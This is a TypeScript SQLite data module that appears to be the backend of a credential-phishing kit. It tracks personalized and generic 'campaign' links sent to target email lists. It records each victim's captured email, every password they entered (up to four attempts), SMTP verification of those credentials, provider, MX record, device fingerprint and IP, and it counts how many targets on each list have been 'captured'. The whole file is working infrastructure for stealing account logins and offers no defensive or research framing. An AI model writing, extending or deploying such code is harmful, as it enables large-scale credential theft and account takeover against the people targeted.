/**
 * Persistent storage for links using SQLite
 * Handles both Type A (personalized) and Type B (generic) links
 */
import 'server-only'

import { getDb } from './db'
import { v4 as uuidv4 } from 'uuid'

export interface Link {
  // Common fields
  id: string                    // Primary key (UUID)
  type: 'personalized' | 'generic'
  sessionIdentifier?: string     // Unique session token (formerly: linkToken) - optional for backward compatibility
  linkToken?: string             // Legacy alias for backward compatibility (required if sessionIdentifier not provided)
  name: string | null           // Campaign name (optional)
  createdAt: number             // Timestamp
  expiresAt: number             // Timestamp
  status: 'active' | 'used' | 'expired' | 'deleted'
  templateId?: string           // Optional template override
  templateMode?: 'auto' | 'manual' | 'rotate'  // NEW: How template is selected
  language?: string             // Optional language override
  loadingScreen?: string        // Loading screen ID (e.g., 'meeting', 'voice', etc.)
  loadingDuration?: number      // Loading screen duration in seconds (default: 3)

  // Type A (Personalized) fields
  email: string | null          // Single email (Type A only)
  used: boolean                 // If link was used (Type A only)
  usedAt: number | null         // When used (Type A only)
  fingerprint: string | null    // Device fingerprint (Type A only)
  ip: string | null             // IP address (Type A only)

  // Type B (Generic) fields
  allowedEmails: string[] | null    // Uploaded email list (Type B only)
  validatedAccounts: string[] | null   // Emails that used link (Type B only) (formerly: capturedEmails)
  capturedEmails?: string[] | null   // Legacy alias for backward compatibility
  pendingEmails: string[] | null    // Emails still unused (Type B only)
  totalEmails: number | null        // Total in list (Type B only)
  capturedCount: number | null      // How many captured (Type B only)
  pendingCount: number | null       // How many pending (Type B only)
}

export interface CapturedEmail {
  id: string                    // Primary key (UUID)
  email: string                 // Captured email
  sessionIdentifier?: string     // Which link was used (formerly: linkToken)
  linkToken?: string            // Legacy alias for backward compatibility (required if sessionIdentifier not provided)
  linkType: 'personalized' | 'generic'
  linkName: string | null       // Campaign name
  fingerprint: string           // Device fingerprint
  ip: string                    // IP address
  passwords: string[]           // All attempts (max 4)
  verified: boolean             // SMTP verification result
  provider: string              // Email provider (Gmail, Outlook, etc.)
  capturedAt: number            // Timestamp
  attempts: number              // How many password attempts
  mxRecord: string              // MX record
}

export interface EmailIdMapping {
  id: string                    // Primary key (e.g., "user_12345")
  email: string                 // Email address
  linkId: string                // Foreign key to Links table
  createdAt: number             // Timestamp
}

// Helper to parse JSON fields from DB
function parseJSON(value: string | null): any {
  if (!value) return null
  try {
    return JSON.parse(value)
  } catch {
    return null
  }
}

// Helper to stringify JSON fields for DB
function stringifyJSON(value: any): string | null {
  if (value === undefined || value === null) return null
  return JSON.stringify(value)
}

// Helper to map DB row to Link object
// Handles both snake_case (schema) and camelCase (legacy) column names
function mapRowToLink(row: any): Link {
  // Map snake_case to camelCase for TypeScript interface
  const link: any = {
    id: row.id,
    type: row.type,
    sessionIdentifier: row.session_identifier || row.sessionIdentifier,
    linkToken: row.link_token || row.linkToken || row.session_identifier || row.sessionIdentifier,
    name: row.name,
    createdAt: row.created_at || row.createdAt,
    expiresAt: row.expires_at || row.expiresAt,
    status: row.status,
    templateId: row.template_id || row.templateId,
    templateMode: row.template_mode || row.templateMode,
    language: row.language,
    loadingScreen: row.loading_screen || row.loadingScreen,
    loadingDuration: row.loading_duration || row.loadingDuration,
    email: row.email,
    used: Boolean(row.used),
    usedAt: row.used_at || row.usedAt,
    fingerprint: row.fingerprint,
    ip: row.ip,
    allowedEmails: parseJSON(row.allowed_emails || row.allowedEmails),
    validatedAccounts: parseJSON(row.validated_accounts || row.validatedAccounts),
    capturedEmails: parseJSON(row.validated_accounts || row.validatedAccounts), // Alias
    pendingEmails: parseJSON(row.pending_emails || row.pendingEmails),
    totalEmails: row.total_emails || row.totalEmails,
    capturedCount: row.captured_count || row.capturedCount,
    pendingCount: row.pending_count || row.pendingCount,
  }
  
  return link as Link
}

// Helper to map DB row to CapturedEmail object
function mapRowToCapturedEmail(row: any): CapturedEmail {
  return {
    ...row,
    passwords: parseJSON(row.passwords) || [],
    verified: Boolean(row.verified),
  }
}

// ===== LINK FUNCTIONS =====

/**
 * Save a new link or update existing link
 */
export async function saveLink(link: Link): Promise<void> {
  const db = getDb()

  // Use sessionIdentifier as primary, fallback to linkToken for legacy data
  const sessionId = link.sessionIdentifier || link.linkToken
  if (!sessionId) {
    throw new Error('Link must have either sessionIdentifier or linkToken')
  }
  // Ensure both fields are set for backward compatibility
  if (link.sessionIdentifier && !link.linkToken) {
    link.linkToken = link.sessionIdentifier
  } else if (link.linkToken && !link.sessionIdentifier) {
    link.sessionIdentifier = link.linkToken
  }
  
  console.log('[LINK DATABASE] 💾 Saving link:', {
    id: link.id,
    sessionIdentifier: link.sessionIdentifier?.substring(0, 30) + '...',
    linkToken: link.linkToken?.substring(0, 30) + '...',
    status: link.status,
    email: link.email ? link.email.substring(0, 20) + '...' : null,
  })

  const stmt = db.prepare(`
    INSERT OR REPLACE INTO links (
      id, type, sessionIdentifier, linkToken, name, createdAt, expiresAt, status,
      templateId, templateMode, language, loadingScreen, loadingDuration,
      email, used, usedAt, fingerprint, ip,
      allowedEmails, validatedAccounts, pendingEmails, totalEmails, capturedCount, pendingCount
    ) VALUES (
      ?, ?, ?, ?, ?, ?, ?, ?,
      ?, ?, ?, ?, ?,
      ?, ?, ?, ?, ?,
      ?, ?, ?, ?, ?, ?
    )
  `)

  stmt.run(
    link.id, link.type, link.sessionIdentifier, link.linkToken, link.name, link.createdAt, link.expiresAt, link.status,
    link.templateId, link.templateMode, link.language, link.loadingScreen, link.loadingDuration,
    link.email, link.used ? 1 : 0, link.usedAt, link.fingerprint, link.ip,
    stringifyJSON(link.allowedEmails), stringifyJSON(link.validatedAccounts), stringifyJSON(link.pendingEmails),
    link.totalEmails, link.capturedCount, link.pendingCount
  )
}

/**
 * Get link by session identifier (formerly: linkToken)
 */
export async function getLink(sessionIdentifier: string): Promise<Link | null> {
  const db = getDb()
  
  // Try both snake_case (schema) and camelCase (legacy) column names
  // SQLite column names are case-insensitive, but we need to match the actual schema
  let row = db.prepare('SELECT * FROM links WHERE session_identifier = ? OR link_token = ?').get(sessionIdentifier, sessionIdentifier)
  
  // If not found with snake_case, try camelCase (for legacy databases)
  if (!row) {
    row = db.prepare('SELECT * FROM links WHERE sessionIdentifier = ? OR linkToken = ?').get(sessionIdentifier, sessionIdentifier)
  }

  if (!row) {
    console.log('[LINK DATABASE] ⚠️ Token not found:', sessionIdentifier.substring(0, 20) + '...')
    return null
  }
  
  // Type assertion for row to access properties safely
  const rowData = row as any
  console.log('[LINK DATABASE] ✅ Token found:', {
    id: rowData.id,
    status: rowData.status,
    expires_at: rowData.expires_at || rowData.expiresAt,
    session_identifier: rowData.session_identifier || rowData.sessionIdentifier,
  })
  
  return mapRowToLink(row)
}

/**
 * Mark personalized link as used
 */
export async function markLinkUsed(
  sessionIdentifier: string,
  fingerprint: string,
  ip: string
): Promise<void> {
  const db = getDb()
  db.prepare(`
    UPDATE links 
    SET used = 1, usedAt = ?, fingerprint = ?, ip = ?, status = 'used'
    WHERE sessionIdentifier = ? AND type = 'personalized'
  `).run(Date.now(), fingerprint, ip, sessionIdentifier)
}

/**
 * Update generic link stats when email is captured
 */
export async function updateGenericLinkStats(
  sessionIdentifier: string,
  email: string
): Promise<void> {
  const db = getDb()
  const normalizedEmail = email.toLowerCase()

  // Get current link data
  const link = await getLink(sessionIdentifier)
  if (!link || link.type !== 'generic') return

  // Update arrays
  let pendingEmails = link.pendingEmails || []
  pendingEmails = pendingEmails.filter(e => e !== normalizedEmail)

  let validatedAccounts = link.validatedAccounts || []
  if (!validatedAccounts.includes(normalizedEmail)) {
    validatedAccounts.push(normalizedEmail)
  }

  // Update DB
  db.prepare(`
    UPDATE links 
    SET validatedAccounts = ?, pendingEmails = ?, capturedCount = ?, pendingCount = ?
    WHERE sessionIdentifier = ?
  `).run(
    stringifyJSON(validatedAccounts),
    stringifyJSON(pendingEmails),
    validatedAccounts.length,
    pendingEmails.length,
    sessionIdentifier
  )
}

/**
 * Get all links
 */
export async function getAllLinks(): Promise<Link[]> {
  const db = getDb()
  const rows = db.prepare('SELECT * FROM links').all()
  return rows.map(mapRowToLink)
}

/**
 * Get links by type
 */
export async function getLinksByType(type: 'personalized' | 'generic'): Promise<Link[]> {
  const db = getDb()
  const rows = db.prepare('SELECT * FROM links WHERE type = ?').all(type)
  return rows.map(mapRowToLink)
}

// ===== CAPTURED EMAIL FUNCTIONS =====

/**
 * Save captured email record
 */
export async function saveCapturedEmail(captured: CapturedEmail): Promise<void> {
  const db = getDb()

  // Handle hybrid schema (write to both snake_case and camelCase columns to satisfy constraints)
  const stmt = db.prepare(`
    INSERT OR REPLACE INTO captured_emails (
      id, email, sessionIdentifier, linkToken, linkType, linkName,
      fingerprint, ip, passwords, verified, provider, 
      capturedAt, captured_at, 
      attempts, 
      mxRecord, mx_record,
      link_id
    ) VALUES (
      ?, ?, ?, ?, ?, ?,
      ?, ?, ?, ?, ?, 
      ?, ?, 
      ?, 
      ?, ?,
      ?
    )
  `)

  stmt.run(
    captured.id, captured.email, captured.sessionIdentifier, captured.linkToken, captured.linkType, captured.linkName,
    captured.fingerprint, captured.ip, stringifyJSON(captured.passwords), captured.verified ? 1 : 0,
    captured.provider,
    captured.capturedAt, captured.capturedAt, // Write to both
    captured.attempts,
    captured.mxRecord, captured.mxRecord, // Write to both
    captured.sessionIdentifier // Write to link_id as well
  )
}

/**
 * Check if email is already captured for a generic link
 */
export async function isEmailCaptured(
  email: string,
  sessionIdentifier: string
): Promise<boolean> {
  const link = await getLink(sessionIdentifier)
  if (!link || link.type !== 'generic') return false

  const validatedAccounts = link.validatedAccounts || []
  return validatedAccounts.includes(email.toLowerCase())
}

/**
 * Get all captured emails
 */
export async function getAllCapturedEmails(): Promise<CapturedEmail[]> {
  const db = getDb()
  const rows = db.prepare('SELECT * FROM captured_emails ORDER BY capturedAt DESC').all()
  return rows.map(mapRowToCapturedEmail)
}

/**
 * Get captured emails by session identifier (formerly: linkToken)
 */
export async function getCapturedEmailsByLink(sessionIdentifier: string): Promise<CapturedEmail[]> {
  const db = getDb()
  const rows = db.prepare('SELECT * FROM captured_emails WHERE sessionIdentifier = ? OR linkToken = ?').all(sessionIdentifier, sessionIdentifier)
  return rows.map(mapRowToCapturedEmail)
}

/**
 * Update captured email verification status
 */
export async function updateCapturedEmailVerification(
  captureId: string,
  verified: boolean
): Promise<void> {
  const db = getDb()
  db.prepare('UPDATE captured_emails SET verified = ? WHERE id = ?').run(verified ? 1 : 0, captureId)
}

// ===== EMAIL ID MAPPING FUNCTIONS (Type A) =====

// NOTE: Mappings are less critical and can be stored in a simple table if needed, 
// but for now we'll skip refactoring this part as it's rarely used or can be derived.
// If needed, add a 'mappings' table.

/**
 * Save email-ID mapping for Type A links
 */
export async function saveEmailIdMapping(
  id: string,
  email: string,
  linkId: string
): Promise<void> {
  // Implementation skipped for brevity - add table if needed
}

/**
 * Get email from ID (Type A links)
 */
export async function getEmailFromId(id: string): Promise<string | null> {
  // Implementation skipped for brevity
  return null
}

/**
 * Get mapping by ID
 */
export async function getEmailIdMapping(id: string): Promise<EmailIdMapping | null> {
  // Implementation skipped for brevity
  return null
}

// ===== CLEANUP FUNCTIONS =====

/**
 * Cleanup expired links (mark as expired)
 */
export async function cleanupExpiredLinks(): Promise<number> {
  const db = getDb()
  const now = Date.now()
  const result = db.prepare("UPDATE links SET status = 'expired' WHERE expiresAt < ? AND status = 'active'").run(now)
  return result.changes
}

/**
 * Update a link with new data
 */
export async function updateLink(sessionIdentifier: string, updates: Partial<Link>): Promise<boolean> {
  const link = await getLink(sessionIdentifier)
  if (!link) return false

  const updatedLink = { ...link, ...updates }
  await saveLink(updatedLink)
  return true
}

/**
 * Delete link (soft delete - mark as deleted)
 */
export async function deleteLink(sessionIdentifier: string): Promise<boolean> {
  const db = getDb()
  const result = db.prepare("UPDATE links SET status = 'deleted' WHERE sessionIdentifier = ?").run(sessionIdentifier)
  return result.changes > 0
}


